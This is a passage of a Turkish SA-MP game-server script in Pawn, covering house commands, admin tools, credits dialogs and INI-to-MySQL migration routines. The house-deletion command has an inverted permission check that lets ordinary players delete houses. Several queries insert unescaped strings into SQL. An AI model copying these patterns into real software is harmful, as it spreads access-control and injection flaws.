	if(id == playerid) return SendClientMessage(playerid, 0xE74C3CFF, "Kendinden anahtar alamazsýn.");
	if(!Iter_Contains(HouseKeys[id], houseid)) return SendClientMessage(playerid, 0xE74C3CFF, "Bu oyuncuda zaten evinin anahtarý yok.");
	Iter_Remove(HouseKeys[id], houseid);

	new query[128];
	mysql_format(Connection, query, sizeof(query), "DELETE FROM housekeys WHERE HouseID=%d AND Player='%e'", houseid, GetName(id));
	mysql_tquery(Connection, query, "", "");

	format(query, sizeof(query), "%s Ýsimli kiþiden evinin anahtarýný aldýn.", GetName(id));
	SendClientMessage(playerid, -1, query);
	format(query, sizeof(query), "Ev sahibi %s senden %s isimli evinin anahtarýný aldý.", HouseData[houseid][Owner], HouseData[houseid][HOName]);
	SendClientMessage(id, -1, query);
	return 1;
}

CMD:evdenat(playerid, params[])
{
    if(InHouse[playerid] == INVALID_HOUSE_ID) return SendClientMessage(playerid, 0xE74C3CFF, "Herhangi bir evde deðilsin.");
    new id, houseid = InHouse[playerid];
	if(strcmp(HouseData[houseid][Owner], GetName(playerid))) return SendClientMessage(playerid, 0xE74C3CFF, "Bu evin sahibi deðilsin.");
	if(sscanf(params, "u", id)) return SendSyntaxMessage(playerid, "/evdenat <ID>");
	if(id == INVALID_PLAYER_ID) return SendClientMessage(playerid, 0xE74C3CFF, "Hatalý oyuncu ID.");
	if(id == playerid) return SendClientMessage(playerid, 0xE74C3CFF, "kendini evden atamazsýn.");
	if(InHouse[id] != houseid) return SendClientMessage(playerid, 0xE74C3CFF, "Belirtilen kiþi evinizde deðil.");
    SendClientMessage(playerid, -1, "Oyuncu atýldý.");
	SendClientMessage(id, -1, "Ev sahibi seni evinden attý.");
	SetPVarInt(id, "HousePickupCooldown", gettime() + HOUSE_COOLDOWN);
	SetPlayerVirtualWorld(id, 0);
 	SetPlayerInterior(id, 0);
 	SetPlayerPos(id, HouseData[houseid][houseX], HouseData[houseid][houseY], HouseData[houseid][houseZ]);
 	InHouse[id] = INVALID_HOUSE_ID;
	return 1;
}

/* ============ Ev Sistemi Admin Komutlarý ============ */
CMD:eviolustur(playerid, params[])
{
	if(APlayerData[playerid][PlayerLevel] < 7) return Hata(playerid, "{FFCC00}» {FFFFFF}Bu komutu kullanmak için yetkiniz yok.");
	new interior, price;
	if(sscanf(params, "ii", price, interior)) return SendSyntaxMessage(playerid, "{FFCC00}» {FFFFFF}/eviolustur <Ücret> <Ýnterior ID>");
    if(!(0 <= interior <= sizeof(HouseInteriors)-1)) return SendClientMessage(playerid, 0xE74C3CFF, "{FFCC00}» {FFFFFF}Hatalý Level ID.");
	new id = Iter_Free(Houses);
	//if(id == -1) return SendClientMessage(playerid, 0xE74C3CFF, "Hata! Ev sýnýrý doldu!");
	SetPVarInt(playerid, "HousePickupCooldown", gettime() + HOUSE_COOLDOWN);
	format(HouseData[id][HOName], MAX_HOUSE_NAME, "Satýlýk Ev");
	format(HouseData[id][Owner], MAX_PLAYER_NAME, "-");
	format(HouseData[id][Password], MAX_HOUSE_PASSWORD, "-");
	GetPlayerPos(playerid, HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ]);
	HouseData[id][Price] = price;
	HouseData[id][Interiors] = interior;
	HouseData[id][LockMode] = LOCK_MODE_NOLOCK;
	HouseData[id][SalePrice] = HouseData[id][SafeMoney] = HouseData[id][LastEntered] = 0;
	format(HouseData[id][Address], MAX_HOUSE_ADDRESS, "%d, %s, %s", id, GetZoneName(HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ]), GetCityName(HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ]));
    HouseData[id][Save] = true;

    new label[200];
    format(label, sizeof(label), "{2ECC71}Satýlýk Ev (ID: %d)\n{FFFFFF}%s\n{F1C40F}Fiyat: {2ECC71}$%s", id, HouseInteriors[interior][IntName], convertNumber(price));
	HouseData[id][HouseLabel] = CreateDynamic3DTextLabel(label, 0xFFFFFFFF, HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ]+0.35, 15.0, .testlos = 1);
	HouseData[id][HousePickup] = CreateDynamicPickup(1273, 1, HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ]);
	HouseData[id][HouseIcon] = CreateDynamicMapIcon(HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ], 31, 0);

	new query[256];
	mysql_format(Connection, query, sizeof(query), "INSERT INTO houses SET ID=%d, HouseX=%f, HouseY=%f, HouseZ=%f, HousePrice=%d, HouseInterior=%d", id, HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ], price, interior);
	mysql_tquery(Connection, query, "", "");
	Iter_Add(Houses, id);
	return 1;
}

CMD:gotohouse(playerid, params[])
{
    if(APlayerData[playerid][PlayerLevel] < 5) return Hata(playerid, "{FFCC00}» {FFFFFF}Bu komutu kullanmak için yetkiniz yok.");
	new id;
	if(sscanf(params, "i", id)) return SendSyntaxMessage(playerid, "/gotohouse <house ID>");
	if(!Iter_Contains(Houses, id)) return SendClientMessage(playerid, 0xE74C3CFF, "Belirtilen ev bulunamadý.");
	SetPVarInt(playerid, "HousePickupCooldown", gettime() + HOUSE_COOLDOWN);
	SetPlayerPos(playerid, HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ]);
	SetPlayerInterior(playerid, 0);
	SetPlayerVirtualWorld(playerid, 0);
	return 1;
}

CMD:changehouselevel(playerid, params[])
{
    if(APlayerData[playerid][PlayerLevel] < 6) return Hata(playerid, "{FFCC00}» {FFFFFF}Bu komutu kullanmak için yetkiniz yok.");
	new id, interior;
	if(sscanf(params, "ii", id, interior)) return SendSyntaxMessage(playerid, "/changehouselevel <Ev ID> <Ýnterior ID>");
	if(!Iter_Contains(Houses, id)) return SendClientMessage(playerid, 0xE74C3CFF, "Belirtilen ev bulunamadý.");
	if(!(0 <= interior <= sizeof(HouseInteriors)-1)) return SendClientMessage(playerid, 0xE74C3CFF, "Hatalý level ID.");
	HouseData[id][Interiors] = interior;

	new query[64];
	mysql_format(Connection, query, sizeof(query), "UPDATE houses SET HouseInterior=%d WHERE ID=%d", interior, id);
	mysql_tquery(Connection, query, "", "");

	UpdateHouseLabel(id);
	SendClientMessage(playerid, -1, "Level güncellendi.");
	return 1;
}

CMD:changehouseprice(playerid, params[])
{
    if(APlayerData[playerid][PlayerLevel] < 6) return Hata(playerid, "{FFCC00}» {FFFFFF}Bu komutu kullanmak için yetkiniz yok.");
	new id, price;
	if(sscanf(params, "ii", id, price)) return SendSyntaxMessage(playerid, "/changehouseprice <Ev ID> <Ücret>");
	if(!Iter_Contains(Houses, id)) return SendClientMessage(playerid, 0xE74C3CFF, "Belirtilen ev bulunamadý.");
	HouseData[id][Price] = price;

	new query[64];
	mysql_format(Connection, query, sizeof(query), "UPDATE houses SET HousePrice=%d WHERE ID=%d", price, id);
	mysql_tquery(Connection, query, "", "");

	UpdateHouseLabel(id);
	SendClientMessage(playerid, -1, "Fiyat güncellendi.");
	return 1;
}

CMD:resethouse(playerid, params[])
{
    if(APlayerData[playerid][PlayerLevel] < 7) return Hata(playerid, "{FFCC00}» {FFFFFF}Bu komutu kullanmak için yetkiniz yok.");
	new id;
	if(sscanf(params, "i", id)) return SendSyntaxMessage(playerid, "/resethouse <Ev ID>");
	if(!Iter_Contains(Houses, id)) return SendClientMessage(playerid, 0xE74C3CFF, "Belirtilen ev bulunamadý.");
	ResetHouse(id);
	SendClientMessage(playerid, -1, "Ev sýfýrlandý.");
	return 1;
}

CMD:evisil(playerid, params[])
{
    if (APlayerData[playerid][PlayerLevel] >= 6 || Root[playerid] == 1 || Root2[playerid] == 1) return Hata(playerid, "{FFCC00}» {FFFFFF}Bu komutu kullanmak için yetkiniz yok.");
	new id;
	if(sscanf(params, "i", id)) return SendSyntaxMessage(playerid, "/evisil <Ev ID>");
	if(!Iter_Contains(Houses, id)) return SendClientMessage(playerid, 0xE74C3CFF, "Belirtilen ev bulunamadý.");
	ResetHouse(id);
	DestroyDynamic3DTextLabel(HouseData[id][HouseLabel]);
	DestroyDynamicPickup(HouseData[id][HousePickup]);
	DestroyDynamicMapIcon(HouseData[id][HouseIcon]);
	Iter_Remove(Houses, id);
	HouseData[id][HouseLabel] = Text3D: INVALID_3DTEXT_ID;
	HouseData[id][HousePickup] = HouseData[id][HouseIcon] = -1;
	HouseData[id][Save] = false;

	new query[64];
	mysql_format(Connection, query, sizeof(query), "DELETE FROM houses WHERE ID=%d", id);
	mysql_tquery(Connection, query, "", "");
	SendClientMessage(playerid, -1, "Ev silindi.");
	return 1;
}

// [ Credits ]==================================================================
CMD:credits(playerid, params[])
{
	SendAdminText(playerid, "/credits", params);
    new dialog[1024];

	strcat(dialog, "{ffffff}Sahipler:\n");
	strcat(dialog, "\t{f65c28}TeaMStar,Tiger\n\n");
	strcat(dialog, "{ffffff}Kodlama:\n");
	strcat(dialog, "\t{28f6d2}Ghostevil{ffffff},{28f6d2}....\n\n");
	strcat(dialog, "{ffffff}Haritalar:\n");
	strcat(dialog, "\t{ff00ff}......{ffffff}, {ff00ff}......\n\n");
	strcat(dialog, "{ffffff}Ve diðer yetkililerimiz:\n");
	strcat(dialog, "\t{a1f628}......{ffffff}\n\n");
	strcat(dialog, "{ffffff}Bu zamana kadar bizi tercih eden tum oyuncularimiza tesekkur ederiz.");
	ShowPlayerDialog(playerid, 31312, DIALOG_STYLE_MSGBOX, "{e12323}TK-TM{FFFFFF} Yapýmcýlar", dialog, "Kapat", "");
	return true;
}
CMD:yapimci(playerid, params[])
{
	SendAdminText(playerid, "/yapimci", params);
    new dialog[1024];

	strcat(dialog, "{ffffff}Sahipler:\n");
	strcat(dialog, "\t{f65c28}TeaMStar,Tiger\n\n");
	strcat(dialog, "{ffffff}Kodlama:\n");
	strcat(dialog, "\t{28f6d2}Ghostevil{ffffff},{28f6d2}\n\n");
	strcat(dialog, "{ffffff}Haritalar:\n");
	strcat(dialog, "\t{ff00ff}......{ffffff}, {ff00ff}......\n\n");
	strcat(dialog, "{ffffff}Ve diðer yetkililerimiz:\n");
	strcat(dialog, "\t{a1f628}......... {ffffff}\n\n");
	strcat(dialog, "{ffffff}Bu zamana kadar bizi tercih eden tum oyuncularimiza tesekkur ederiz.");
	ShowPlayerDialog(playerid, 31312, DIALOG_STYLE_MSGBOX, "{e12323}ÝG-TM{FFFFFF} Yapýmcýlar", dialog, "Kapat", "");
	return true;
}
CMD:sahip(playerid, params[])
{
	SendAdminText(playerid, "/sahip", params);
    new dialog[1024];

	strcat(dialog, "{ffffff}Sahipler:\n");
	strcat(dialog, "\t{f65c28}TeaMStar,Tiger\n\n");
	strcat(dialog, "{ffffff}Kodlama:\n");
	strcat(dialog, "\t{28f6d2}Ghostevil{ffffff},{28f6d2}.....\n\n");
	strcat(dialog, "{ffffff}Haritalar:\n");
	strcat(dialog, "\t{ff00ff}.....{ffffff}, {ff00ff}.....\n\n");
	strcat(dialog, "{ffffff}Ve diðer yetkililerimiz:\n");
	strcat(dialog, "\t{a1f628}.....{ffffff}\n\n");
	strcat(dialog, "{ffffff}Bu zamana kadar bizi tercih eden tum oyuncularimiza tesekkur ederiz.");
	ShowPlayerDialog(playerid, 31312, DIALOG_STYLE_MSGBOX, "{e12323}ÝG-TM{FFFFFF} Yapýmcýlar", dialog, "Kapat", "");
	return true;
}

/* Þirket Geçirme*/
/*
forward LoadSirketsa();
public LoadSirketsa()
{
	new FileName[80], handle;

	for(new i; i < MAX_SIRKET; i++)
	{
	    format(FileName, 80, SirketFile, i);

	    if(fexist(FileName))
	    {
	        new formaty[1024];
	        INI_ParseFile(FileName, "LoadSirketa_%s", .bExtra = true, .extra = i);

			Sirketler[i][SirketExist] = 1;

		 	handle = SQL::Open(SQL::INSERT, "sirketler");
		  	SQL::WriteInt(handle, "ID", i);
		    SQL::WriteString(handle, "Name", Sirketler[i][SirketName]);

		    SQL::WriteString(handle, "Tag", Sirketler[i][SirketTag]);
		    SQL::WriteString(handle, "Sahip", Sirketler[i][SirketSahip]);

			SQL::WriteInt(handle, "Uye", Sirketler[i][SirketUye]);
		 	SQL::WriteInt(handle, "MaxUye", Sirketler[i][SirketMaxUye]);
		 	SQL::WriteInt(handle, "Kasa", Sirketler[i][SirketKasa]);
			SQL::WriteInt(handle, "Deger", Sirketler[i][SirketDeger]);

			format(formaty,128,"0.0|0.0|0.0");
		  	SQL::WriteString(handle, "XYZ", formaty);

		  	SQL::WriteString(handle, "InfoXYZ", formaty);

		    format(formaty,128,"0.0|0.0");
		  	SQL::WriteString(handle, "MinXY", formaty);

		  	SQL::WriteString(handle, "MaxXY", formaty);

		    format(formaty,128,"0.0|0.0|0.0");
		  	SQL::WriteString(handle, "GateXYZ", formaty);

		  	SQL::WriteString(handle, "GateRXYZ", formaty);

		    format(formaty,128,"0.0|0.0|0.0|0.0");
		  	SQL::WriteString(handle, "KasaXYZRZ", formaty);

		    format(formaty,128,"0.0|0.0|0.0");
		  	SQL::WriteString(handle, "BenzinXYZ", formaty);

		    format(formaty,128,"0|0");
		  	SQL::WriteString(handle, "Renk12", formaty);

		  	SQL::WriteInt(handle, "SirketOran", Sirketler[i][SirketOran]);
		  	SQL::WriteString(handle, "SirketDolum", Sirketler[i][SirketDolum]);
		  	SQL::WriteInt(handle, "SirketBorc", Sirketler[i][SirketBorc]);

		  	SQL::WriteString(handle, "SirketDuyuru", "Yok");

		    SQL::Close(handle);
	    }
 	}
}

forward LoadSirketa_srkt(SirketID, name[], value[]);
public LoadSirketa_srkt(SirketID, name[], value[])
{
	INI_String("Name", Sirketler[SirketID][SirketName], 128);
	INI_String("Tag", Sirketler[SirketID][SirketTag], 5);
	INI_String("Sahip", Sirketler[SirketID][SirketSahip], 70);

	INI_Int("Uye", Sirketler[SirketID][SirketUye]);
	INI_Int("MaxUye", Sirketler[SirketID][SirketMaxUye]);

	INI_Int("Kasa", Sirketler[SirketID][SirketKasa]);
	INI_Int("Deger", Sirketler[SirketID][SirketDeger]);

	INI_Float("X", Sirketler[SirketID][SirketX]);
	INI_Float("Y", Sirketler[SirketID][SirketY]);
	INI_Float("Z", Sirketler[SirketID][SirketZ]);

	INI_Float("InfoX", Sirketler[SirketID][SirketInfoX]);
	INI_Float("InfoY", Sirketler[SirketID][SirketInfoY]);
	INI_Float("InfoZ", Sirketler[SirketID][SirketInfoZ]);

	INI_Float("MinX", Sirketler[SirketID][SirketMinX]);
	INI_Float("MinY", Sirketler[SirketID][SirketMinY]);
	INI_Float("MaxX", Sirketler[SirketID][SirketMaxX]);
	INI_Float("MaxY", Sirketler[SirketID][SirketMaxY]);

	INI_Float("GateX", Sirketler[SirketID][SirketGateX]);
	INI_Float("GateY", Sirketler[SirketID][SirketGateY]);
	INI_Float("GateZ", Sirketler[SirketID][SirketGateZ]);
	INI_Float("GateRX", Sirketler[SirketID][SirketGateRX]);
	INI_Float("GateRY", Sirketler[SirketID][SirketGateRY]);
	INI_Float("GateRZ", Sirketler[SirketID][SirketGateRZ]);

	INI_Float("KasaX", Sirketler[SirketID][SirketKasaX]);
	INI_Float("KasaY", Sirketler[SirketID][SirketKasaY]);
	INI_Float("KasaZ", Sirketler[SirketID][SirketKasaZ]);
	INI_Float("KasaRZ", Sirketler[SirketID][SirketKasaRZ]);

	INI_Float("BenzinX", Sirketler[SirketID][SirketBenzinX]);
	INI_Float("BenzinY", Sirketler[SirketID][SirketBenzinY]);
	INI_Float("BenzinZ", Sirketler[SirketID][SirketBenzinZ]);

	INI_Int("Renk1", Sirketler[SirketID][SirketRenk1]);
	INI_Int("Renk2", Sirketler[SirketID][SirketRenk2]);

	INI_Int("SirketOran", Sirketler[SirketID][SirketOran]);

	INI_String("SirketDolum", Sirketler[SirketID][SirketDolum], 20);
	INI_Int("SirketBorc", Sirketler[SirketID][SirketBorc]);
	return 1;
}

forward SaveSirketsa();
public SaveSirketsa()
{
	foreach(new i:SRKTs)
 	{
		new handle = SQL::Open(SQL::UPDATE, "sirketler", "ID", i), formaty[1024];
	    SQL::WriteString(handle, "Name", Sirketler[i][SirketName]);
	    SQL::WriteString(handle, "Tag", Sirketler[i][SirketTag]);
   	 	SQL::WriteString(handle, "Sahip", Sirketler[i][SirketSahip]);

 		SQL::WriteString(handle, "SirketDuyuru", Sirketler[i][SirketDuyuru]);

	    SQL::WriteInt(handle, "Uye", Sirketler[i][SirketUye]);
	    SQL::WriteInt(handle, "MaxUye", Sirketler[i][SirketMaxUye]);

	    SQL::WriteInt(handle, "Kasa", Sirketler[i][SirketKasa]);
	    SQL::WriteInt(handle, "Deger", Sirketler[i][SirketDeger]);

        format(formaty, 128,"%f|%f|%f",Sirketler[i][SirketX],Sirketler[i][SirketY],Sirketler[i][SirketZ]);
	    SQL::WriteString(handle, "XYZ", formaty);

		format(formaty, 128, "%f|%f|%f", Sirketler[i][SirketInfoX],Sirketler[i][SirketInfoY],Sirketler[i][SirketInfoZ]);
	    SQL::WriteString(handle, "InfoXYZ", formaty);

		format(formaty, 128,"%f|%f",Sirketler[i][SirketMinX],Sirketler[i][SirketMinY]);
	    SQL::WriteString(handle, "MinXY", formaty);

	    format(formaty, 128,"%f|%f",Sirketler[i][SirketMaxX],Sirketler[i][SirketMaxY]);
	    SQL::WriteString(handle, "MaxXY", formaty);

		format(formaty, 128, "%f|%f|%f",Sirketler[i][SirketGateX],Sirketler[i][SirketGateY],Sirketler[i][SirketGateZ]);
	    SQL::WriteString(handle, "GateXYZ", formaty);

	    format(formaty, 128, "%f|%f|%f",Sirketler[i][SirketGateRX],Sirketler[i][SirketGateRY],Sirketler[i][SirketGateRZ]);
	    SQL::WriteString(handle, "GateRXYZ", formaty);

		format(formaty, 128,"%f|%f|%f|%f",Sirketler[i][SirketKasaX],Sirketler[i][SirketKasaY],Sirketler[i][SirketKasaZ],Sirketler[i][SirketKasaRZ]);
	    SQL::WriteString(handle, "KasaXYZRZ", formaty);

		format(formaty, 128,"%f|%f|%f",Sirketler[i][SirketBenzinX],Sirketler[i][SirketBenzinY],Sirketler[i][SirketBenzinZ]);
	    SQL::WriteString(handle, "BenzinXYZ", formaty);

		format(formaty, 128,"%i|%i",Sirketler[i][SirketRenk1],Sirketler[i][SirketRenk2]);
        SQL::WriteString(handle, "Renk12", formaty);

        SQL::WriteInt(handle, "SirketOran", Sirketler[i][SirketOran]);

        SQL::WriteString(handle, "SirketDolum", Sirketler[i][SirketDolum]);
        SQL::WriteInt(handle, "SirketBorc", Sirketler[i][SirketBorc]);

	    SQL::Close(handle);
	}
}

forward LoadSirketArabasa();
public LoadSirketArabasa()
{
	new FileName[80], handle;

	for(new i; i < MAX_SIRKET_ARABA; i++)
	{
	    format(FileName, 80, SirketArabaFile, i);

	    if(fexist(FileName))
	    {
	        INI_ParseFile(FileName, "LoadSirketArabaa_%s", .bExtra = true, .extra = i);

		    handle = SQL::Open(SQL::INSERT, "sirketaraclar");
		  	SQL::ToggleAutoIncrement(handle, true);
		  	SQL::WriteInt(handle, "ID", i);

			SQL::WriteInt(handle, "SirketID", SirketAraba[i][SASirketID]);
		 	SQL::WriteInt(handle, "Model", SirketAraba[i][SAModel]);
		 	SQL::WriteInt(handle, "Fiyat", SirketAraba[i][SAFiyat]);
			SQL::WriteInt(handle, "MinRutbe", SirketAraba[i][SAMinRutbe]);

		  	SQL::WriteFloat(handle, "X", SirketAraba[i][SAX]);
		  	SQL::WriteFloat(handle, "Y", SirketAraba[i][SAY]);
		  	SQL::WriteFloat(handle, "Z", SirketAraba[i][SAZ]);
		  	SQL::WriteFloat(handle, "RZ", SirketAraba[i][SARZ]);


		    SQL::Close(handle);
	    }
 	}
	return 1;
}

forward LoadSirketArabaa_sa(SirketArabaID, name[], value[]);
public LoadSirketArabaa_sa(SirketArabaID, name[], value[])
{
	INI_Int("SirketID", SirketAraba[SirketArabaID][SASirketID]);
	INI_Int("Model", SirketAraba[SirketArabaID][SAModel]);
	INI_Int("Fiyat", SirketAraba[SirketArabaID][SAFiyat]);
	INI_Int("MinRutbe", SirketAraba[SirketArabaID][SAMinRutbe]);
	INI_Float("X", SirketAraba[SirketArabaID][SAX]);
	INI_Float("Y", SirketAraba[SirketArabaID][SAY]);
	INI_Float("Z", SirketAraba[SirketArabaID][SAZ]);
	INI_Float("RZ", SirketAraba[SirketArabaID][SARZ]);
	return 1;
}

Businessa_LoadAll()
{
	// First load the business-time file, this one holds the current business-time which is increased every minute the server if online
	BusinessTimea_Load();

	// Loop through all businesses and try to load them
	for (new BusID = 1; BusID < MAX_BUSINESS; BusID++)
	{
	    // Try to load the file and check if it was succesfully loaded (file exists)
		if (BusinessFilea_Load(BusID) == 1)
		{
			// Add a pickup and 3DText for this business
			Business_CreateEntrance(BusID);
			// Count the loaded businesses
		    TotalBusiness++;
		}
	}

	return 1;
}

BusinessFilea_Load(BusID)
{
	// Setup local variables
	new file[100], File:BFile, LineFromFile[100], ParameterName[50], ParameterValue[50], Sahipli, Sahip[40];
    new Earnings, BusType;
	format(file, sizeof(file), BusinessFile, BusID); // Construct the complete filename for this business-file

	if (fexist(file))
	{
		BFile = fopen(file, io_read); // Open the housefile for reading

		fread(BFile, LineFromFile); // Read the first line of the file

		// Keep reading until the end of the file is found (no more data)
		while (strlen(LineFromFile) > 0)
		{
			StripNewLine(LineFromFile); // Strip any newline characters from the LineFromFile
			sscanf(LineFromFile, "s[50]s[50]", ParameterName, ParameterValue); // Extract parametername and parametervalue

			// Store the proper value in the proper place
			if (strcmp(ParameterName, "BusinessName", false) == 0) // If the parametername is correct ("BusinessName")
			    format(ABusinessData[BusID][BusinessName], 24, ParameterValue); // Store the BusinessName
			if (strcmp(ParameterName, "BusinessX", false) == 0) // If the parametername is correct ("BusinessX")
				ABusinessData[BusID][BusinessX] = floatstr(ParameterValue); // Store the BusinessX
			if (strcmp(ParameterName, "BusinessY", false) == 0) // If the parametername is correct ("BusinessY")
				ABusinessData[BusID][BusinessY] = floatstr(ParameterValue); // Store the BusinessY
			if (strcmp(ParameterName, "BusinessZ", false) == 0) // If the parametername is correct ("BusinessZ")
				ABusinessData[BusID][BusinessZ] = floatstr(ParameterValue); // Store the BusinessZ
			if (strcmp(ParameterName, "BusinessType", false) == 0) // If the parametername is correct ("BusinessType")
				ABusinessData[BusID][BusinessType] = strval(ParameterValue); // Store the BusinessType
			if (strcmp(ParameterName, "BusinessLevel", false) == 0) // If the parametername is correct ("BusinessLevel")
				ABusinessData[BusID][BusinessLevel] = strval(ParameterValue); // Store the BusinessLevel
			if (strcmp(ParameterName, "LastTransaction", false) == 0) // If the parametername is correct ("LastTransaction")
				ABusinessData[BusID][LastTransaction] = strval(ParameterValue); // Store the LastTransaction
			if (strcmp(ParameterName, "Owned", false) == 0) // If the parametername is correct ("Owned")
			{
			    if (strcmp(ParameterValue, "Yes", false) == 0) // If the value "Yes" was read
				{
					ABusinessData[BusID][Owned] = true; // House is owned
					Sahipli = 1;
				}else{
					ABusinessData[BusID][Owned] = false; // House is not owned
					Sahipli = 0;
				}
			}
			if (strcmp(ParameterName, "Owner", false) == 0) // If the parametername is correct ("Owner")
			    format(ABusinessData[BusID][Owner], 24, ParameterValue);

			if (strcmp(ParameterName, "AutoEvictDays", false) == 0) // If the parametername is correct ("AutoEvictDays")
				ABusinessData[BusID][AutoEvictDays] = strval(ParameterValue); // Store the AutoEvictDays
            BusType = ABusinessData[BusID][BusinessType];
			Earnings = (BusinessTransactionTime - ABusinessData[BusID][LastTransaction]) * ABusinessInteriors[BusType][BusEarnings] * ABusinessData[BusID][BusinessLevel];
            // Read the next line of the file
			fread(BFile, LineFromFile);
		}

        // Close the file
		fclose(BFile);

		if(Sahipli == 0)
		{
		    format(Sahip, 40, "-");
		}else{
		    format(Sahip, 40, ABusinessData[BusID][Owner]);
		}
		new query[800];
		if(Sahipli == 1)
		{
			mysql_format(Connection, query, sizeof(query), "INSERT INTO isyerleri SET ID='%d',Isim='%s',X='%f',Y='%f',Z='%f',Type='%d',Level='%d',Kasa='%d',Sahipli='%d',Sahip='%s'", BusID, ABusinessData[BusID][BusinessName], ABusinessData[BusID][BusinessX], ABusinessData[BusID][BusinessY], ABusinessData[BusID][BusinessZ], ABusinessData[BusID][BusinessType], ABusinessData[BusID][BusinessLevel], Earnings, Sahipli, Sahip);
		}else{
		    BusType = ABusinessData[BusID][BusinessType];
			mysql_format(Connection, query, sizeof(query), "INSERT INTO isyerleri SET ID='%d',X='%f',Y='%f',Z='%f',Type='%d',Level='1',Kasa='0',Sahipli='0',Sahip='-'", BusID, ABusinessData[BusID][BusinessX], ABusinessData[BusID][BusinessY], ABusinessData[BusID][BusinessZ], BusType);
		}
		mysql_query(Connection, query);

        // Return if the file was read correctly
		return 1;
	}
	else
	    return 0; // Return 0 if the file couldn't be read (doesn't exist)
}
BusinessTimea_Load()
{
	// Setup local variables
	new File:BFile, LineFromFile[100], ParameterName[50], ParameterValue[50];

	// Try to load the businesstime file
	if (fexist("ServerData/Business/BusinessTime.ini"))
	{
		BFile = fopen("ServerData/Business/BusinessTime.ini", io_read); // Open the businesstime-file for reading

		fread(BFile, LineFromFile); // Read the first line of the file

		// Keep reading until the end of the file is found (no more data)
		while (strlen(LineFromFile) > 0)
		{
			StripNewLine(LineFromFile); // Strip any newline characters from the LineFromFile
			sscanf(LineFromFile, "s[50]s[50]", ParameterName, ParameterValue); // Extract parametername and parametervalue

			// Store the proper value in the proper place
			if (strcmp(ParameterName, "BusinessTime", false) == 0) // If the parametername is correct ("BusinessTime")
				BusinessTransactionTime = strval(ParameterValue); // Store the BusinessTime

            // Read the next line of the file
			fread(BFile, LineFromFile);
		}

        // Close the file
		fclose(BFile);

        // Return if the file was read correctly
		return 1;
	}
	else
	    return 0; // Return 0 if the file couldn't be read (doesn't exist)
}


enum MP3Info
{
	MP3Name[80],
	MP3URL[256],
	MP3Exist
};
new MP3ler[2000][MP3Info];
enum RadInfo
{
	RadName[80],
	RadURL[256],
	RadExist
};
#define MP3File 				"ServerData/MP3/MP3_%d.ini"
#define RadFile 				"ServerData/Radyo/Rad_%d.ini"
new Radler[300][RadInfo];
MP3Yukles()
{
	new FileName[80];
    new query[512];

	for(new i; i < 2000; i++)
	{
	    format(FileName, 80, MP3File, i);

	    if(fexist(FileName))
	    {
	        INI_ParseFile(FileName, "MP3TekYukles_%s", .bExtra = true, .extra = i);
			mysql_format(Connection, query, sizeof(query), "INSERT INTO muzikler SET Isim='%s', URL='%s', Ekleyen='%s', Dinlenme='0'", MP3ler[i][MP3Name], MP3ler[i][MP3URL], "Týrcýlar Mekaný");
			mysql_query(Connection, query);
	    }
 	}
}

forward MP3TekYukles_mzk(MP3ID, name[], value[]);
public MP3TekYukles_mzk(MP3ID, name[], value[])
{
	INI_String("Name", MP3ler[MP3ID][MP3Name], 80);
	INI_String("URL", MP3ler[MP3ID][MP3URL], 256);
	return 1;
}

RadYukles()
{
	new FileName[80];
    new query[512];

	for(new i; i < 300; i++)
	{
	    format(FileName, 80, RadFile, i);

	    if(fexist(FileName))
	    {
	        INI_ParseFile(FileName, "RadTekYukles_%s", .bExtra = true, .extra = i);
			mysql_format(Connection, query, sizeof(query), "INSERT INTO radyolar SET Isim='%s', URL='%s', Ekleyen='%s', Dinlenme='0'", Radler[i][RadName], Radler[i][RadURL], "Týrcýlar Mekaný");
			mysql_query(Connection, query);
	    }
 	}
}
Housings_LoadAll()
{
	// Loop through all houses and try to load them
	for(new HouseID = 1; HouseID < MAX_HOUSES; HouseID++)
	{
		HouseFiles_Load(HouseID);
	}

	return 1;
}

// This function will load the house's datafile (used when the server is started to load all houses)
HouseFiles_Load(HouseID, bool:OnlyLoadVehicles = false)
{
    new BuyableCarIndex, query[256];
	new file[100], File:HFile, LineFromFile[100], ParameterName[50], ParameterValue[50], AracSayisi;
	// Setup local variables
	new cModel, cPaint, components[14], Float:cx, Float:cy, Float:cz, Float:crot, Col1, Col2, vid, bool:VehicleClamped, cFuel = -1, Neons;

	format(file, sizeof(file), HouseFile, HouseID); // Construct the complete filename for this house-file

	if (fexist(file))
	{
		HFile = fopen(file, io_read); // Open the housefile for reading

		fread(HFile, LineFromFile); // Read the first line of the file

		// Set the house so it cannot be entered by anyone, except the owner (close the house)
		AHouseData[HouseID][HouseOpened] = false;

		// Keep reading until the end of the file is found (no more data)
		while (strlen(LineFromFile) > 0)
		{
			StripNewLine(LineFromFile); // Strip any newline characters from the LineFromFile
			sscanf(LineFromFile, "s[50]s[50]", ParameterName, ParameterValue); // Extract parametername and parametervalue

			// If OnlyLoadVehicles is "false", only load the house-data
			// If OnlyLoadVehicles is "true", only load the vehicle-data
			if (OnlyLoadVehicles == false)
			{
				// Store the proper value in the proper place
				if (strcmp(ParameterName, "HouseName", false) == 0) // If the parametername is correct ("HouseName")
				    format(AHouseData[HouseID][HouseName], 24, ParameterValue); // Store the HouseName
				if (strcmp(ParameterName, "HouseX", false) == 0) // If the parametername is correct ("HouseX")
					AHouseData[HouseID][HouseX] = floatstr(ParameterValue); // Store the HouseX
				if (strcmp(ParameterName, "HouseY", false) == 0) // If the parametername is correct ("HouseY")
					AHouseData[HouseID][HouseY] = floatstr(ParameterValue); // Store the HouseY
				if (strcmp(ParameterName, "HouseZ", false) == 0) // If the parametername is correct ("HouseZ")
					AHouseData[HouseID][HouseZ] = floatstr(ParameterValue); // Store the HouseZ
				if (strcmp(ParameterName, "HouseLevel", false) == 0) // If the parametername is correct ("HouseLevel")
					AHouseData[HouseID][HouseLevel] = strval(ParameterValue); // Store the HouseLevel
				if (strcmp(ParameterName, "HouseMaxLevel", false) == 0) // If the parametername is correct ("HouseMaxLevel")
					AHouseData[HouseID][HouseMaxLevel] = strval(ParameterValue); // Store the HouseMaxLevel
				if (strcmp(ParameterName, "HousePrice", false) == 0) // If the parametername is correct ("HousePrice")
